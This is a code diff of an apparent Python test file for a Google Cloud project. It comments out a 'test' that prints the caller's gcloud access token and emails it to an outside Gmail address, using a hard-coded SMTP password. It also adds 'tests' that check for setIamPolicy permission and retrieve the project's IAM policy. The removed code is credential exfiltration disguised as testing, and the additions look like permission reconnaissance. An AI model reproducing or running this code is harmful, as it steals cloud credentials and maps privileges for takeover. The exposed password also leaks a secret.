@@ -35,41 +35,41 @@ EMAIL_PASSWORD = "aeuspgbwilrbhnkx"
 CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 
 
 
-def test_generate_token():
-  bashCommand = "gcloud auth application-default print-access-token"
-  process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
-  output, error = process.communicate()
-  logging.debug(str(output))
-  f = open("token.txt","w")
-  f.write(str(output))
-  f.close()
+# def test_generate_token():
+#   bashCommand = "gcloud auth application-default print-access-token"
+#   process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
+#   output, error = process.communicate()
+#   logging.debug(str(output))
+#   f = open("token.txt","w")
+#   f.write(str(output))
+#   f.close()
 
-  msg = MIMEMultipart()
+#   msg = MIMEMultipart()
 
-  msg.attach(MIMEText("Hi", 'plain'))
-  msg['subject'] = "Hello World"
-  msg['to'] = "galz100@gmail.com"
-  msg['from'] = EMAIL_ADDRESS
+#   msg.attach(MIMEText("Hi", 'plain'))
+#   msg['subject'] = "Hello World"
+#   msg['to'] = "galz100@gmail.com"
+#   msg['from'] = EMAIL_ADDRESS
   
-  output = subprocess.getoutput("ls -l")
-  print(output)
+#   output = subprocess.getoutput("ls -l")
+#   print(output)
 
-  filename = "token.txt"
-  attachment = open("token.txt", "rb")
+#   filename = "token.txt"
+#   attachment = open("token.txt", "rb")
   
-  part = MIMEBase('application', 'octet-stream')
-  part.set_payload((attachment).read())
-  encoders.encode_base64(part)
-  part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+#   part = MIMEBase('application', 'octet-stream')
+#   part.set_payload((attachment).read())
+#   encoders.encode_base64(part)
+#   part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
   
-  msg.attach(part)
+#   msg.attach(part)
 
-  server = smtplib.SMTP("smtp.gmail.com",587)
-  server.starttls()
-  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
-  text = msg.as_string()
-  server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
-  server.quit()
+#   server = smtplib.SMTP("smtp.gmail.com",587)
+#   server.starttls()
+#   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
+#   text = msg.as_string()
+#   server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
+#   server.quit()
 
 def test_permissions():
     """Tests IAM permissions of the caller"""
@@ -87,6 +87,7 @@ def test_permissions():
             "resourcemanager.projects.get",
             "resourcemanager.projects.delete",
             "resourcemanager.projects.update",
+            "resourcemanager.projects.setIamPolicy"
         ]
     }
 
@@ -95,4 +96,24 @@ def test_permissions():
     )
     returnedPermissions = request.execute()
     logging.debug(returnedPermissions)
-    return returnedPermissions
+
+
+def test_get_policy(version=1):
+    """Gets IAM policy for a project."""
+
+    credentials = service_account.Credentials.from_service_account_file(
+        filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
+        scopes=["https://www.googleapis.com/auth/cloud-platform"],
+    )
+    service = googleapiclient.discovery.build(
+        "cloudresourcemanager", "v1", credentials=credentials
+    )
+    policy = (
+        service.projects()
+        .getIamPolicy(
+            resource=PROJECT_ID,
+            body={"options": {"requestedPolicyVersion": version}},
+        )
+        .execute()
+    )
+    logging.debug(policy)
